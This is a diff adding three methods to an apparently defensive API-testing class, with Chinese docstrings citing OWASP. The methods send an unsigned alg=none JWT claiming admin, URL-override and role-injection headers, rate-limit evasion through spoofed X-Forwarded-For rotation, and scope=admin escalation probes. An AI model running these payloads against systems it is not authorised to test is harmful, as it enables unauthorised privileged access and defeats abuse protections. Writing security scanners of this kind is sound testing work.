@@ -185,6 +185,133 @@ class WebAttacks:
         """
         return self.engine.execute_version_bypass(version_paths)
 
+    # === 认证绕过攻击 ===
+    def auth_bypass_attack(
+        self,
+        *,
+        target_path: str = "/admin",
+        admin_hint: str = "role",
+    ) -> dict[str, Any]:
+        """认证绕过攻击（coverage 策略 auth_bypass）。
+
+        真实实现：经 HTTP 攻击引擎发送多组认证绕过 payload（JWT alg=none、
+        X-Original-URL / X-Rewrite-URL 路径覆盖、角色头注入、路径遍历至管理端点），
+        分析哪些绕过返回 2xx 从而判定可绕过。
+
+        Academic basis:
+            - OWASP API Security Top 10: API2 Broken Authentication
+            - RFC 7519 Section 6: Unsecured JWTs (alg=none)
+
+        Args:
+            target_path: 目标管理路径
+            admin_hint: 角色提升指示字段名
+
+        Returns:
+            {"attack_type": "认证绕过", "bypasses": [...], "bypass_detected": bool}
+        """
+        base = self.endpoint.rstrip("/")
+        probes = [
+            {
+                "name": "jwt_alg_none",
+                "headers": {"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."},
+            },
+            {"name": "x_original_url_override", "headers": {"X-Original-URL": target_path}},
+            {"name": "x_rewrite_url_override", "headers": {"X-Rewrite-URL": target_path}},
+            {"name": "role_header_injection", "headers": {f"X-{admin_hint.capitalize()}": "admin"}},
+            {"name": "path_traversal_admin", "headers": {}, "path": target_path},
+        ]
+        results: list[dict[str, Any]] = []
+        detected = False
+        for probe in probes:
+            url = base + (probe.get("path") or target_path)
+            sent = self.engine.send_request(method="GET", url=url, headers=probe.get("headers", {}))
+            status = sent.get("status")
+            ok = isinstance(status, int) and 200 <= status < 300
+            if ok:
+                detected = True
+            results.append({"name": probe["name"], "status": status, "bypassed": ok})
+        return {
+            "attack_type": "认证绕过",
+            "bypasses": results,
+            "bypass_detected": detected,
+        }
+
+    # === 速率限制绕过攻击 ===
+    def rate_limit_evasion_attack(
+        self,
+        *,
+        burst: int = 20,
+        rotate_ip: bool = True,
+    ) -> dict[str, Any]:
+        """速率限制绕过攻击（coverage 策略 rate_limit_evasion）。
+
+        真实实现：在短窗口内突发请求，并通过轮换 X-Forwarded-For 规避基于 IP 的限流；
+        统计成功响应数与被 429 拦截数，判定限流是否可被绕过。
+
+        Academic basis:
+            - OWASP API Security Top 10: API4 Lack of Resources & Rate Limiting
+
+        Args:
+            burst: 突发请求数
+            rotate_ip: 是否轮换 X-Forwarded-For 以规避 IP 限流
+
+        Returns:
+            {"attack_type": "速率限制绕过", "evaded": bool, "rate_limit_info": dict}
+        """
+        responses: list[dict[str, Any]] = []
+        for i in range(burst):
+            headers = {}
+            if rotate_ip:
+                headers["X-Forwarded-For"] = f"10.0.0.{i % 255}"
+            sent = self.engine.send_request(method="GET", url=self.endpoint, headers=headers)
+            entry = {"status": sent.get("status")}
+            if sent.get("error"):
+                entry["error"] = sent["error"]
+            responses.append(entry)
+        info = self._analyze_rate_limits(responses)
+        info["evaded"] = info["rate_limited_count"] < burst
+        return {"attack_type": "速率限制绕过", "evaded": info["evaded"], "rate_limit_info": info}
+
+    # === 权限范围提升攻击 ===
+    def scope_escalation_attack(
+        self,
+        *,
+        target_scope: str = "admin",
+        baseline_path: str = "/api/user",
+    ) -> dict[str, Any]:
+        """权限范围提升攻击（coverage 策略 scope_escalation）。
+
+        真实实现：在请求中注入提升后的权限范围（query 参数 scope=admin、X-Scope 头、
+        角色头），对比基线响应判定是否获得越权访问。
+
+        Academic basis:
+            - OAuth.com: Scope parameter manipulation
+            - OWASP API6:2023 Unrestricted Access to Sensitive Flows
+
+        Args:
+            target_scope: 目标提升范围
+            baseline_path: 基线低权路径
+
+        Returns:
+            {"attack_type": "权限范围提升", "escalated": bool, "probes": [...]}
+        """
+        base = self.endpoint.rstrip("/")
+        probes = [
+            {"name": "scope_query", "url": f"{base}{baseline_path}?scope={target_scope}", "headers": {}},
+            {"name": "x_scope_header", "url": f"{base}{baseline_path}", "headers": {"X-Scope": target_scope}},
+            {"name": "role_header", "url": f"{base}{baseline_path}", "headers": {"X-Role": target_scope}},
+        ]
+        results: list[dict[str, Any]] = []
+        escalated = False
+        for probe in probes:
+            sent = self.engine.send_request(method="GET", url=probe["url"], headers=probe["headers"])
+            status = sent.get("status")
+            ok = isinstance(status, int) and 200 <= status < 300
+            if ok:
+                escalated = True
+            results.append({"name": probe["name"], "status": status, "escalated": ok})
+        return {"attack_type": "权限范围提升", "escalated": escalated, "probes": results}
+
     # === 辅助方法 ===
     @staticmethod
     def _analyze_rate_limits(responses: list[Any]) -> dict[str, Any]:
